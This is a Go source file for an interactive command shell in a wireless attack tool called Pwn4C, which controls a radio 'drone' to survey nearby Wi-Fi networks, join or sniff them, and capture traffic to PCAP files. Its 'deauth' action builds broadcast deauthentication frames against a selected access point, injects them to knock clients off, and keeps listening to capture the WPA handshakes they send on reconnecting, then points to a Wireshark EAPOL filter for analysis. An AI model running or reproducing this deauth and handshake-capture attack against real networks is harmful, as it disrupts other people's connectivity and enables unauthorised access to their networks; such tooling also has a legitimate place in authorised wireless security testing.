package cmd

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

var (
	shellTarget string
)

// shellNet is the operator's selected network from the last survey.
type shellNet struct {
	ssid    string
	bssid   string
	channel int
	hidden  bool
}

type shellState struct {
	client   *drone.ControlClient
	target   string
	in       *bufio.Scanner
	nets     []drone.WirelessNetwork
	selected *shellNet
}

var shellCmd = &cobra.Command{
	Use:   "shell [target_ip]",
	Short: "Interactive menu for everything the drone can do, in one session",
	Long: `Opens a single control session and drives the whole drone from a numbered
menu — survey networks, pick one, join it, listen to it, deauth it — without
juggling separate commands and reconnects.

Inside the menu, actions that need a network operate on the selected one
(use 'networks' then 'use <#>').`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := shellTarget
		if len(args) > 0 {
			target = args[0]
		}
		target = resolveTargetOrExit(target)

		client := connectOrExit(target)

		st := &shellState{
			client: client,
			target: target,
			in:     bufio.NewScanner(os.Stdin),
		}

		status, err := client.GetStatus()
		if err == nil {
			fmt.Printf("[+] Session opened: %s @ %s (firmware %s)\n",
				status.DroneID, target, status.FirmwareVersion)
		}

		st.run()
	},
}

const shellMenu = `
  1) status       drone telemetry
  2) networks     survey nearby networks
  3) use          select a network from the last survey (# or SSID)
  4) connect      join the selected network (asks password; hidden OK)
  5) wifi         show the drone's upstream link
  6) leave        disconnect the drone from the upstream network
  7) listen       capture the selected network into a PCAP (Ctrl+C stops)
  8) deauth       deauth the selected network, then capture automatically
  9) stop         stop monitor mode / hopping
 10) hop          hop across channels (default 1,6,11)
 11) power        set TX power (1-20 dBm)
 12) reboot       reboot the drone
  q) quit

`

func (s *shellState) run() {
	defer s.client.Close()

	for {
		fmt.Print("\n╔══ Pwn4C shell — ")
		if s.selected != nil {
			label := s.selected.ssid
			if s.selected.hidden || label == "" {
				label = "<hidden network>"
			}
			fmt.Printf("target %s · selected: %s (ch%d)", s.target, label, s.selected.channel)
		} else {
			fmt.Printf("target %s · no network selected", s.target)
		}
		fmt.Println(" ══╗")
		fmt.Print(shellMenu)
		fmt.Print("pwn4c> ")
		if !s.in.Scan() {
			if s.in.Err() != nil {
				s.in = bufio.NewScanner(os.Stdin)
				fmt.Println()
				continue
			}
			fmt.Println()
			return
		}
		line := strings.TrimSpace(s.in.Text())
		if line == "" {
			continue
		}
		if !s.dispatch(line) {
			return
		}
	}
}

// dispatch handles one menu input; returns false when the shell should exit.
func (s *shellState) dispatch(line string) bool {
	arg := ""
	if i := strings.IndexAny(line, " \t"); i >= 0 {
		arg = strings.TrimSpace(line[i+1:])
		line = line[:i]
	}
	line = strings.ToLower(line)

	switch line {
	case "1", "status":
		s.doStatus()
	case "2", "networks", "scan":
		s.doNetworks()
	case "3", "use":
		s.doUse(arg)
	case "4", "connect":
		s.doConnect()
	case "5", "wifi":
		s.doWifiStatus()
	case "6", "leave":
		s.doLeave()
	case "7", "listen":
		s.doListen(false)
	case "8", "deauth":
		s.doListen(true)
	case "9", "stop":
		s.doStop()
	case "10", "hop":
		s.doHop(arg)
	case "11", "power":
		s.doPower(arg)
	case "12", "reboot":
		s.doReboot()
	case "menu", "help", "h", "?":
		// the menu prints every round already
	case "q", "quit", "exit":
		fmt.Println("[*] Closing the session (monitor mode is stopped automatically).")
		return false
	default:
		fmt.Println("[!] Unknown option — pick a number from the menu or 'quit'.")
	}
	return true
}

func (s *shellState) doStatus() {
	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("\n================ DRONE TELEMETRY ================")
	fmt.Printf(" Drone ID         : %s\n", st.DroneID)
	fmt.Printf(" Firmware         : %s\n", st.FirmwareVersion)
	fmt.Printf(" State            : %s\n", st.State)
	fmt.Printf(" Monitor Active   : %t\n", st.MonitorActive)
	fmt.Printf(" Current Channel  : %d\n", st.Channel)
	fmt.Printf(" Uptime           : %s\n",
		(time.Duration(st.UptimeSeconds) * time.Second).Round(time.Second))
	fmt.Printf(" Free RAM         : %d MB\n", st.FreeRAMBytes/(1024*1024))
	fmt.Printf(" RX / TX Frames   : %d / %d\n", st.RxFrames, st.TxFrames)
	fmt.Println("=================================================")
}

func (s *shellState) doNetworks() {
	fmt.Println("[*] Surveying networks (the drone sweeps channels 1-13)...")
	nets, err := s.client.ScanNetworks(4000)
	if err != nil {
		fmt.Printf("[!] Scan failed: %v\n", err)
		return
	}
	s.nets = nets
	if len(nets) == 0 {
		fmt.Println("[-] Nothing heard. Try again or move the antenna.")
		return
	}
	printNetworkTable(nets)
	fmt.Println("    Pick one with: use <# or SSID>")
}

func (s *shellState) doUse(arg string) {
	if len(s.nets) == 0 {
		fmt.Println("[!] Run 'networks' first to build the survey list.")
		return
	}
	if arg == "" {
		fmt.Print("[*] Network # or SSID (empty = cancel): ")
		if !s.in.Scan() {
			return
		}
		arg = strings.TrimSpace(s.in.Text())
		if arg == "" {
			return
		}
	}

	var pick *shellNet
	if idx, err := strconv.Atoi(arg); err == nil && idx >= 1 && idx <= len(s.nets) {
		n := s.nets[idx-1]
		pick = &shellNet{ssid: n.SSID, bssid: n.BSSID, channel: n.Channel, hidden: n.Hidden}
	} else {
		for i := range s.nets {
			if strings.EqualFold(s.nets[i].SSID, arg) || strings.EqualFold(s.nets[i].BSSID, arg) {
				n := s.nets[i]
				pick = &shellNet{ssid: n.SSID, bssid: n.BSSID, channel: n.Channel, hidden: n.Hidden}
				break
			}
		}
	}

	if pick == nil {
		fmt.Printf("[!] '%s' is not in the last survey — run 'networks' again.\n", arg)
		return
	}
	s.selected = pick
	label := pick.ssid
	if pick.hidden || label == "" {
		label = fmt.Sprintf("<hidden network, BSSID %s>", pick.bssid)
	}
	fmt.Printf("[+] Selected: %s (BSSID %s, channel %d)\n", label, pick.bssid, pick.channel)
	fmt.Println("    Available actions: connect · listen · deauth")
}

func (s *shellState) askYN(prompt string, defYes bool) bool {
	suffix := " [Y/n]: "
	if !defYes {
		suffix = " [y/N]: "
	}
	fmt.Print(prompt + suffix)
	if !s.in.Scan() {
		return false
	}
	ans := strings.ToLower(strings.TrimSpace(s.in.Text()))
	if ans == "" {
		return defYes
	}
	return ans == "y" || ans == "yes"
}

func (s *shellState) doConnect() {
	ssid := ""
	if s.selected != nil {
		ssid = s.selected.ssid
	}
	fmt.Print("[*] SSID to join (empty = selected network): ")
	if !s.in.Scan() {
		return
	}
	typed := strings.TrimSpace(s.in.Text())
	if typed != "" {
		ssid = typed
	}
	if ssid == "" {
		fmt.Println("[!] No SSID — run 'networks' + 'use' first, or type a name.")
		return
	}
	hidden := s.selected != nil && (s.selected.hidden || s.selected.ssid == "") && typed == ""

	fmt.Print("[*] Password (hidden input; empty = open network): ")
	raw, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	password := strings.TrimSpace(string(raw))

	if hidden {
		fmt.Printf("[*] '%s' is not visible in the air — the drone will scan for it by name.\n", ssid)
	}

	if err := s.client.WifiConnect(ssid, password, "", ""); err != nil {
		fmt.Printf("[!] Connect failed: %v\n", err)
		return
	}

	fmt.Println("[*] Waiting for association (up to 45s)...")
	deadline := time.Now().Add(45 * time.Second)
	for time.Now().Before(deadline) {
		st, err := s.client.WifiStatus()
		if err == nil && st.Connected {
			fmt.Printf("[+] Joined '%s' — IP: %s (channel %d)\n", st.SSID, st.IP, st.Channel)
			return
		}
		time.Sleep(2 * time.Second)
	}
	fmt.Println("[!] Association timed out. Check the password and retry; 'wifi' shows the current state.")
}

func (s *shellState) doWifiStatus() {
	st, err := s.client.WifiStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if !st.Connected {
		fmt.Println("[-] Not associated with any network.")
		return
	}
	fmt.Printf("[+] Upstream: %s (BSSID %s, ch%d, IP %s)\n", st.SSID, st.BSSID, st.Channel, st.IP)
}

func (s *shellState) doLeave() {
	if err := s.client.WifiDisconnect(); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[+] Left the network; radio is back to idle (DOWN).")
}

// doListen implements both 'listen' (deauth=false) and 'deauth' (deauth=true).
// The deauth flow injects the burst and keeps the very same session listening
// for the handshake.
func (s *shellState) doListen(deauth bool) {
	channel := 6
	bssid := ""
	label := "the current channel"

	if s.selected != nil {
		channel = s.selected.channel
		bssid = s.selected.bssid
		label = fmt.Sprintf("%s (BSSID %s, ch%d)", s.selected.ssid, s.selected.bssid, s.selected.channel)
	} else {
		fmt.Printf("[*] No network selected — listening on channel %d without a BSSID filter.\n", channel)
		fmt.Print("[*] Channel to listen on (empty = 6): ")
		if !s.in.Scan() {
			return
		}
		if v := strings.TrimSpace(s.in.Text()); v != "" {
			if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
				channel = ch
			} else {
				fmt.Println("[!] Invalid channel — staying on 6.")
			}
		}
	}

	if deauth && (bssid == "") {
		fmt.Println("[!] Deauth needs a selected network (with a BSSID). Run 'networks' + 'use' first.")
		return
	}

	defName := fmt.Sprintf("capture-%s.pcap", time.Now().Format("20060102-150405"))
	if deauth {
		defName = "handshake.pcap"
	}
	fmt.Printf("[*] Output PCAP (empty = %s): ", defName)
	if !s.in.Scan() {
		return
	}
	outPath := strings.TrimSpace(s.in.Text())
	if outPath == "" {
		outPath = defName
	}

	if deauth {
		count := 25
		fmt.Printf("[*] Deauth frame count (empty = %d): ", count)
		if !s.in.Scan() {
			return
		}
		if v := strings.TrimSpace(s.in.Text()); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 256 {
				count = n
			}
		}

		frameHex, err := drone.BuildDeauthFrame(bssid, "ff:ff:ff:ff:ff:ff", drone.ReasonClass3FromNonAssocSTA)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}

		st, err := s.client.GetStatus()
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}
		if !st.MonitorActive {
			if err := s.client.StartMonitor(channel); err != nil {
				fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
				return
			}
		} else if st.Channel != channel {
			if err := s.client.SetChannel(channel); err != nil {
				fmt.Printf("[!] Failed to switch channel: %v\n", err)
				return
			}
		}

		receiver := s.startReceiver(outPath)
		fmt.Printf("[+] Injecting %d deauth frames against %s...\n", count, bssid)
		sent, queued, failed, err := s.client.SendInjection(frameHex, count, 10)
		if err != nil {
			receiver.Close()
			fmt.Printf("[!] Injection failed: %v\n", err)
			return
		}
		fmt.Printf("[+] Transmitted: %d, Queued: %d, Failed: %d\n", sent, queued, failed)
		if queued > 0 {
			waitForTxDrain(s.client, 5*time.Second)
		}
		fmt.Println("[+] Deauth sent — listening for reconnections and handshakes.")
		fmt.Printf("    Capturing %s -> %s\n", label, outPath)
		fmt.Println("    Press Ctrl+C to stop.")

		waitForInterrupt()

		fmt.Println("\n[*] Stopping capture...")
		receiver.Close()
		fmt.Printf("[+] Capture saved: %s\n", outPath)
		fmt.Println("    wireshark -r " + outPath + "   (filter: eapol || wlan.fc.type_subtype == 0x0c)")
		return
	}

	// Plain listen
	receiver := s.startReceiver(outPath)
	fmt.Printf("[+] Entering monitor mode on channel %d", channel)
	if bssid != "" {
		fmt.Printf(" (BSSID filter %s)", bssid)
	}
	fmt.Println()
	if err := s.client.StartMonitor(channel); err != nil {
		receiver.Close()
		fmt.Printf("[!] Failed to start monitor: %v\n", err)
		return
	}
	if bssid != "" {
		if err := s.client.SetFilter(false, bssid); err != nil {
			fmt.Printf("[!] Warning: BPF filter failed: %v\n", err)
		}
	}
	fmt.Printf("    Capturing %s -> %s\n", label, outPath)
	fmt.Println("    Press Ctrl+C to stop.")

	waitForInterrupt()

	fmt.Println("\n[*] Stopping capture...")
	receiver.Close()
	fmt.Printf("[+] Capture saved: %s\n", outPath)
}

func (s *shellState) startReceiver(outPath string) *drone.FrameReceiver {
	var frames uint64
	receiver, err := drone.StartStreamReceiver(drone.DefaultStreamPort, outPath, func(seq uint32, frame []byte) {
		frames++
		if frames == 1 || frames%50 == 0 {
			fmt.Printf("\r[+] Captured %d frames...", frames)
		}
	})
	if err != nil {
		fmt.Printf("[!] Failed to bind UDP stream receiver: %v\n", err)
		os.Exit(1)
	}
	return receiver
}

func (s *shellState) doStop() {
	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if !st.MonitorActive {
		fmt.Println("[-] Monitor mode is not active.")
		return
	}
	_ = s.client.StopHop()
	if err := s.client.StopMonitor(); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[+] Monitor mode stopped; radio restored.")
}

func (s *shellState) doHop(arg string) {
	channels := []int{1, 6, 11}
	if arg != "" {
		parsed, err := parseChannelList(arg)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}
		channels = parsed
	}
	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if !st.MonitorActive {
		if err := s.client.StartMonitor(channels[0]); err != nil {
			fmt.Printf("[!] Failed to start monitor: %v\n", err)
			return
		}
	}
	if err := s.client.StartHop(channels, 250); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("[+] Hopping across %v (250ms dwell). 'stop' ends it.\n", channels)
}

func (s *shellState) doPower(arg string) {
	if arg == "" {
		fmt.Print("[*] TX power in dBm (1-20, empty = cancel): ")
		if !s.in.Scan() {
			return
		}
		arg = strings.TrimSpace(s.in.Text())
		if arg == "" {
			return
		}
	}
	dbm, err := strconv.Atoi(arg)
	if err != nil || dbm < 1 || dbm > 20 {
		fmt.Println("[!] Power must be 1-20.")
		return
	}
	if err := s.client.SetTxPower(dbm); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("[+] TX power set to %d dBm.\n", dbm)
}

func (s *shellState) doReboot() {
	if !s.askYN("[*] Reboot the drone now?", false) {
		return
	}
	if err := s.client.Reboot(); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[+] Rebooting. Re-run 'pwn4c shell' once the drone is back (~60s).")
}

func init() {
	shellCmd.Flags().StringVarP(&shellTarget, "target", "t", "", "Target drone IP (defaults to auto-discovery)")
	rootCmd.AddCommand(shellCmd)
}
